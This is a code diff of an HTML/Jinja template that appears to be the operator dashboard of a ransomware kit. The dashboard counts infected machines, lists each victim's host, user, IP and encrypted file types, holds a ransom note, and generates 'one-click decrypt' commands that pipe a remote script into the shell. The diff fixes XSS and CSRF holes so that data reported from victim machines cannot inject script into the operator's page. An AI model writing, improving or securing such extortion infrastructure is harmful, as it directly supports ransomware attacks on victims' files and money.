@@ -17,7 +17,10 @@
   <a href="#settings" class="nav-item" onclick="showTab('settings')"><i class="fas fa-user-cog"></i><span>账户设置</span></a>
   <div class="sidebar-foot">
     <span class="user-badge"><i class="fas fa-user-shield"></i> {{ session.username }}</span>
-    <a href="{{ url_for('logout') }}"><i class="fas fa-sign-out-alt"></i> 退出</a>
+    <form method="post" action="{{ url_for('logout') }}" id="logout-form" style="display:inline">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <a href="#" onclick="event.preventDefault();document.getElementById('logout-form').submit();"><i class="fas fa-sign-out-alt"></i> 退出</a>
+    </form>
   </div>
 </nav>
 <button class="hamburger" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>
@@ -25,7 +28,7 @@
 <section class="stats-row">
   <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num">{{ total }}</span><label>已感染</label></div></div>
   <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num">{{ total_pages }}</span><label>页数</label></div></div>
-  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
+  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">6</span><label>平台</label></div></div>
 </section>
 
 <section class="panel" id="panel-gen">
@@ -129,7 +132,8 @@ Contact us to obtain the private key and restore your files.</textarea>
   <td>{{ v.machine_name }}</td><td>{{ v.computer_user }}</td>
   <td><span class="os-badge">{{ v.os }}</span></td>
   <td>{{ v.ip }}</td><td>{{ v.date }}</td>
-  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail('{{ v.id }}','{{ v.encrypted_detail|default("{}")|e }}')">{{ v.encrypted_count|default(0) }} 个</a></td>
+  {# encrypted_detail 来自外部上报，绝不能拼进 onclick 的 JS 字符串 —— 改走 data-* #}
+  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" data-vid="{{ v.id }}" data-det="{{ v.encrypted_detail|default('{}') }}" onclick="event.preventDefault();showFileDetail(this)">{{ v.encrypted_count|default(0) }} 个</a></td>
   <td style="color:#4dc3fa">{{ sz }}</td>
   <td style="min-width:150px">
     <div style="display:flex;align-items:center;gap:8px">
@@ -145,20 +149,21 @@ Contact us to obtain the private key and restore your files.</textarea>
   </td>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all">{{ v.encrypted_types|default('') }}</span></td>
   <td style="white-space:nowrap">
-    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('{{ v.id }}','{{ v.ip }}',{{ 'true' if is_linux else 'false' }})" title="一键解密"><i class="fas fa-unlock"></i></button>
+    {# v.ip 来自外部上报(握手接口)，拼进 onclick 即可注入 JS -> 改走 data-* #}
+    <button class="btn-sm" style="background:#10b981" data-vid="{{ v.id }}" data-ip="{{ v.ip }}" data-linux="{{ '1' if is_linux else '0' }}" onclick="showDecrypt(this)" title="一键解密"><i class="fas fa-unlock"></i></button>
   </td>
 </tr>
 {% endfor %}
 </tbody></table></div>
 {% if total_pages > 1 %}
 <nav class="pagination">
-  <a href="?search={{ search }}&pageno=1" {% if page<=1 %}class="disabled"{% endif %}>&laquo;</a>
-  <a href="?search={{ search }}&pageno={{ [1,page-1]|max }}" {% if page<=1 %}class="disabled"{% endif %}>&lsaquo;</a>
+  <a href="?search={{ search|urlencode }}&pageno=1" {% if page<=1 %}class="disabled"{% endif %}>&laquo;</a>
+  <a href="?search={{ search|urlencode }}&pageno={{ [1,page-1]|max }}" {% if page<=1 %}class="disabled"{% endif %}>&lsaquo;</a>
   {% for p in range([1,page-3]|max, [total_pages,page+3]|min +1) %}
-  <a href="?search={{ search }}&pageno={{ p }}" {% if p==page %}class="active"{% endif %}>{{ p }}</a>
+  <a href="?search={{ search|urlencode }}&pageno={{ p }}" {% if p==page %}class="active"{% endif %}>{{ p }}</a>
   {% endfor %}
-  <a href="?search={{ search }}&pageno={{ [total_pages,page+1]|min }}" {% if page>=total_pages %}class="disabled"{% endif %}>&rsaquo;</a>
-  <a href="?search={{ search }}&pageno={{ total_pages }}" {% if page>=total_pages %}class="disabled"{% endif %}>&raquo;</a>
+  <a href="?search={{ search|urlencode }}&pageno={{ [total_pages,page+1]|min }}" {% if page>=total_pages %}class="disabled"{% endif %}>&rsaquo;</a>
+  <a href="?search={{ search|urlencode }}&pageno={{ total_pages }}" {% if page>=total_pages %}class="disabled"{% endif %}>&raquo;</a>
 </nav>
 {% endif %}
 </section>
@@ -240,75 +245,131 @@ curl -sL {{ request.url_root }}payloads/jasmin_unlock.sh | sh -s {{ request.url_
 </main>
 <script>
 function checkUpdate(){
-  var r=document.getElementById('update-result');
-  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
+  var r=document.getElementById('update-result');r.textContent='';
+  var sp=document.createElement('span');sp.className='loading';
+  var spi=document.createElement('i');spi.className='fas fa-spinner fa-spin';sp.appendChild(spi);
+  sp.appendChild(document.createTextNode(' 正在检查...'));r.appendChild(sp);
   fetch('/update').then(x=>x.json()).then(d=>{
-    if(!d.update){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 (v'+d.current+')</div>';return;}
-    var info='远程版本: <b>v'+d.latest+'</b>';
-    if(d.latest_commit)info+=' | 提交: '+d.latest_commit+' — '+d.message;
-    if(d.date)info+='<br>时间: '+d.date;
-    r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 发现新版本<br>'+info
-      +'<br><br><button class="btn btn-red" onclick="doUpdate()"><i class="fas fa-download"></i> 一键更新</button></div>';
-  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
+    r.textContent='';
+    var box=document.createElement('div');box.className='gen-ok';
+    var ic=document.createElement('i');
+    if(!d.update){
+      ic.className='fas fa-check-circle';box.appendChild(ic);
+      box.appendChild(document.createTextNode(' 已是最新版本 (v'+d.current+')'));
+      r.appendChild(box);return;
+    }
+    ic.className='fas fa-arrow-circle-up';box.appendChild(ic);
+    box.appendChild(document.createTextNode(' 发现新版本'));box.appendChild(document.createElement('br'));
+    // 远程版本/提交信息属外部数据(GitHub) -> 一律 textContent，不拼 innerHTML
+    var line='远程版本: v'+d.latest;
+    if(d.latest_commit)line+=' | 提交: '+d.latest_commit+' — '+(d.message||'');
+    if(d.date)line+='  时间: '+d.date;
+    box.appendChild(document.createTextNode(line));
+    box.appendChild(document.createElement('br'));box.appendChild(document.createElement('br'));
+    var btn=document.createElement('button');btn.className='btn btn-red';btn.onclick=doUpdate;
+    var bi=document.createElement('i');bi.className='fas fa-download';btn.appendChild(bi);
+    btn.appendChild(document.createTextNode(' 一键更新'));box.appendChild(btn);
+    r.appendChild(box);
+  }).catch(e=>{r.textContent='';var eb=document.createElement('div');eb.className='gen-err';eb.textContent='检查失败: '+e;r.appendChild(eb);});
 }
 function doUpdate(){
-  var r=document.getElementById('update-result');
-  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
+  var r=document.getElementById('update-result');r.textContent='';
+  var sp=document.createElement('span');sp.className='loading';
+  var spi=document.createElement('i');spi.className='fas fa-spinner fa-spin';sp.appendChild(spi);
+  sp.appendChild(document.createTextNode(' 正在更新，请勿刷新...'));r.appendChild(sp);
   fetch('/do_update',{method:'POST',body:new URLSearchParams({csrf_token:'{{ csrf_token() }}'})}).then(x=>x.json()).then(d=>{
-    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="/dashboard" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
-    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
-  }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
+    r.textContent='';
+    if(d.ok){
+      var box=document.createElement('div');box.className='gen-ok';
+      var ic=document.createElement('i');ic.className='fas fa-check-circle';box.appendChild(ic);
+      box.appendChild(document.createTextNode(' 更新完成 ('+(d.method||'')+')'));
+      box.appendChild(document.createElement('br'));
+      var pre=document.createElement('pre');pre.style.cssText='margin-top:8px;font-size:.78rem;color:#94a3b8';
+      pre.textContent=(d.output||d.msg||'');box.appendChild(pre);
+      box.appendChild(document.createElement('br'));
+      var a=document.createElement('a');a.href='/dashboard';a.className='btn btn-red';
+      a.style.cssText='display:inline-flex;margin-top:8px';
+      var ai=document.createElement('i');ai.className='fas fa-redo';a.appendChild(ai);
+      a.appendChild(document.createTextNode(' 刷新页面'));box.appendChild(a);
+      r.appendChild(box);
+    }else{
+      var eb=document.createElement('div');eb.className='gen-err';
+      var ei=document.createElement('i');ei.className='fas fa-times-circle';eb.appendChild(ei);
+      eb.appendChild(document.createTextNode(' '+(d.msg||'')));r.appendChild(eb);
+    }
+  }).catch(e=>{r.textContent='';var eb=document.createElement('div');eb.className='gen-err';eb.textContent='更新失败: '+e;r.appendChild(eb);});
 }
 function showDT(t){
   document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
   document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
   var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
-  event.target.classList.add('active');
+  (event.currentTarget||event.target).classList.add('active');
 }
 function showTab(t){
   document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
   var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
-  event.target.closest('.nav-item').classList.add('active');
+  var ni=event.target.closest('.nav-item')||(event.currentTarget&&event.currentTarget.closest('.nav-item'));
+  if(ni)ni.classList.add('active');
 }
 var _detOpen=null;
-function showFileDetail(vid,jsonStr){
+function showFileDetail(a){
+  var vid=a.dataset.vid||'';
+  var jsonStr=a.dataset.det||'{}';
   if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==vid){_detOpen=null;return;}_detOpen=null;}
   var d;try{d=JSON.parse(jsonStr);}catch(e){d={};}
   var keys=Object.keys(d).sort();
   if(!keys.length)return;
   function fmtSz(b){if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';if(b>=1048576)return(b/1048576).toFixed(2)+' MB';if(b>=1024)return(b/1024).toFixed(2)+' KB';return b+' B';}
-  var h='<table style="width:100%;font-size:.8rem;border-collapse:collapse"><thead><tr style="color:var(--accent2)"><th style="text-align:left;padding:6px 10px">文件类型</th><th style="text-align:right;padding:6px 10px">数量</th><th style="text-align:right;padding:6px 10px">大小</th><th style="padding:6px 10px">占比</th></tr></thead><tbody>';
   var total=0;keys.forEach(function(k){total+=d[k].count;});
+  // ★ 文件类型名(键)与数量来自外部上报：全部走 DOM + textContent，绝不拼 innerHTML
+  var table=document.createElement('table');
+  table.style.cssText='width:100%;font-size:.8rem;border-collapse:collapse';
+  var thead=document.createElement('thead'),htr=document.createElement('tr');
+  htr.style.color='var(--accent2)';
+  [['文件类型','text-align:left;padding:6px 10px'],['数量','text-align:right;padding:6px 10px'],['大小','text-align:right;padding:6px 10px'],['占比','padding:6px 10px']].forEach(function(c){
+    var th=document.createElement('th');th.textContent=c[0];th.style.cssText=c[1];htr.appendChild(th);
+  });
+  thead.appendChild(htr);table.appendChild(thead);
+  var tbody=document.createElement('tbody');
   keys.forEach(function(k){
     var pct=total?Math.round(d[k].count/total*100):0;
-    var bar='<div style="background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block"><div style="background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%"></div></div>';
-    h+='<tr style="border-top:1px solid var(--border)"><td style="padding:5px 10px;color:#f59e0b;font-weight:600">'+k+'</td><td style="text-align:right;padding:5px 10px">'+d[k].count+' 个</td><td style="text-align:right;padding:5px 10px;color:#4dc3fa">'+fmtSz(d[k].size)+'</td><td style="padding:5px 10px">'+bar+' '+pct+'%</td></tr>';
+    var tr=document.createElement('tr');tr.style.borderTop='1px solid var(--border)';
+    var td0=document.createElement('td');td0.textContent=k;td0.style.cssText='padding:5px 10px;color:#f59e0b;font-weight:600';
+    var td1=document.createElement('td');td1.textContent=d[k].count+' 个';td1.style.cssText='text-align:right;padding:5px 10px';
+    var td2=document.createElement('td');td2.textContent=fmtSz(d[k].size);td2.style.cssText='text-align:right;padding:5px 10px;color:#4dc3fa';
+    var td3=document.createElement('td');td3.style.padding='5px 10px';
+    var bar=document.createElement('div');bar.style.cssText='background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block';
+    var inner=document.createElement('div');inner.style.cssText='background:var(--accent2);height:8px;border-radius:4px';inner.style.width=pct+'%';
+    bar.appendChild(inner);td3.appendChild(bar);td3.appendChild(document.createTextNode(' '+pct+'%'));
+    tr.appendChild(td0);tr.appendChild(td1);tr.appendChild(td2);tr.appendChild(td3);tbody.appendChild(tr);
   });
-  h+='</tbody></table>';
-  var btns=document.querySelectorAll('a[onclick*="showFileDetail"]');
-  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf("'"+vid+"'")>-1){tr=b.closest('tr');break;}}
-  if(!tr)return;
+  table.appendChild(tbody);
+  var row=a.closest('tr');if(!row)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.innerHTML=h;
-  nr.appendChild(td);tr.after(nr);_detOpen=nr;
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.appendChild(table);
+  nr.appendChild(td);row.after(nr);_detOpen=nr;
 }
 var _decOpen=null;
-function showDecrypt(vid,ip,isLinux){
+function showDecrypt(btn){
+  var vid=btn.dataset.vid||'';
+  var ip=btn.dataset.ip||'';
+  var isLinux=btn.dataset.linux==='1';
   var srv=location.origin;
   var k='{{ aes_key }}';
   if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
-  var btns=document.querySelectorAll('button[onclick*="showDecrypt"]');
-  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf("'"+vid+"'")>-1){tr=b.closest('tr');break;}}
-  if(!tr)return;
+  var row=btn.closest('tr');if(!row)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
   var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
+  var pre=document.createElement('pre');pre.className='dt-code';
+  // ★ ip 来自外部上报：用 textContent（不是 innerHTML）—— 既保留换行又杜绝注入
   if(isLinux){
-    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\n# 不写目录 = 解密全部加密文件\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"</pre>';
+    pre.textContent='# '+ip+' 一键解密 — 纯 openssl 零依赖\n# 不写目录 = 解密全部加密文件\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'"';
   }else{
-    td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+   (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
+    pre.textContent=':: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\n:: 要求 PowerShell 7+   (winget install Microsoft.PowerShell)\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K "'+k+'" -Paths C:\path\to\decrypt';
   }
-  nr.appendChild(td);tr.after(nr);_decOpen=nr;
+  td.appendChild(pre);
+  nr.appendChild(td);row.after(nr);_decOpen=nr;
 }
 function genKey(force){
   var r=document.getElementById('key-result');
@@ -416,7 +477,7 @@ function submitPassword(){
         r.innerHTML='<span style="color:#10b981"><i class="fas fa-check-circle"></i> '+j.msg+'</span>';
         ['pw-cur','pw-new','pw-new2'].forEach(function(id){document.getElementById(id).value='';});
         pwStrength();
-        setTimeout(function(){location.href='/logout';},2000);
+        setTimeout(function(){document.getElementById('logout-form').submit();},2000);
       }else{
         r.innerHTML='<span style="color:#ef4444"><i class="fas fa-times-circle"></i> '+j.msg+'</span>';
       }
